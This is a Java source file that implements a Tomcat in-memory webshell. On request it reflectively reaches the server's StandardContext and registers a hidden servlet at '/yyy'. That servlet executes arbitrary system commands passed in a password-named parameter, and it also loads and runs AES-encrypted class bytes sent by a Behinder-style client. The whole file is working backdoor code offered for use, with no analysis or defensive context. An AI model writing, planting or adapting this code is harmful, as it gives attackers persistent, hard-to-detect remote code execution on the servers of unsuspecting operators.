package com.memshell.tomcat;

import com.sun.jmx.mbeanserver.NamedObject;
import com.sun.jmx.mbeanserver.Repository;
import org.apache.catalina.Wrapper;
import org.apache.catalina.core.ApplicationServletRegistration;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.modeler.Registry;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.management.DynamicMBean;
import javax.management.MBeanServer;
import javax.management.ObjectName;
import javax.servlet.*;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Scanner;
import java.util.Set;
import java.util.UUID;

public class ServletBasedWithoutRequest extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
        try{
            String servrletName = "myServlet2";
            String urlPattern = "/yyy";
            final String password = "pass";

            MBeanServer mbeanServer = Registry.getRegistry(null, null).getMBeanServer();
            Field field = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
            field.setAccessible(true);
            Object obj = field.get(mbeanServer);

            field = Class.forName("com.sun.jmx.interceptor.DefaultMBeanServerInterceptor").getDeclaredField("repository");
            field.setAccessible(true);
            Repository repository  = (Repository) field.get(obj);

            Set<NamedObject> objectSet =  repository.query(new ObjectName("Catalina:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
            for(NamedObject namedObject : objectSet){
                try{
                    DynamicMBean dynamicMBean = namedObject.getObject();
                    field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
                    field.setAccessible(true);
                    obj = field.get(dynamicMBean);

                    field = Class.forName("org.apache.catalina.authenticator.AuthenticatorBase").getDeclaredField("context");
                    field.setAccessible(true);
                    StandardContext standardContext = (StandardContext)field.get(obj);

                    if(standardContext.findChild(servrletName) == null){
                        System.out.println("[+] Add Dynamic Servlet");

                        Wrapper wrapper = standardContext.createWrapper();
                        wrapper.setName(servrletName);
                        standardContext.addChild(wrapper);
                        Servlet servlet = new HttpServlet() {
                            @Override
                            protected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {
                                doGet(request, response);
                            }

                            @Override
                            protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
                                System.out.println("[+] Dynamic Servlet says hello");

                                String type = request.getParameter("type");
                                if(type != null && type.equals("basic")){
                                    String cmd = request.getParameter(password);
                                    if(cmd != null && !cmd.isEmpty()){
                                        String result = new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
                                        response.getWriter().println(result);
                                    }
                                }else if(type != null && type.equals("behinder")){
                                    try{
                                        if(request.getParameter(password) != null){
                                            String key = ("" + UUID.randomUUID()).replace("-","").substring(16);
                                            request.getSession().setAttribute("u", key);
                                            response.getWriter().print(key);
                                            return;
                                        }

                                        Cipher cipher = Cipher.getInstance("AES");
                                        cipher.init(2, new SecretKeySpec((request.getSession().getAttribute("u") + "").getBytes(), "AES"));
                                        byte[] evilClassBytes = cipher.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
                                        Class evilClass = new U(this.getClass().getClassLoader()).g(evilClassBytes);
                                        Object evilObject = evilClass.newInstance();
                                        Method targetMethod = evilClass.getDeclaredMethod("equals", new Class[]{ServletRequest.class, ServletResponse.class});
                                        targetMethod.invoke(evilObject, new Object[]{request, response});
                                    }catch(Exception e){
                                        e.printStackTrace();
                                    }
                                }
                            }

                            class U extends ClassLoader{
                                U(ClassLoader c){super(c);}

                                public Class g(byte []b){return super.defineClass(b,0,b.length);}
                            }
                        };

                        wrapper.setServletClass(servlet.getClass().getName());
                        wrapper.setServlet(servlet);
                        ServletRegistration.Dynamic registration = new ApplicationServletRegistration(wrapper, standardContext);
                        registration.addMapping(urlPattern);
                    }
                }catch(Exception e){
                    //pass
                }
            }
        }catch(Exception e){
            e.printStackTrace();
        }
    }
}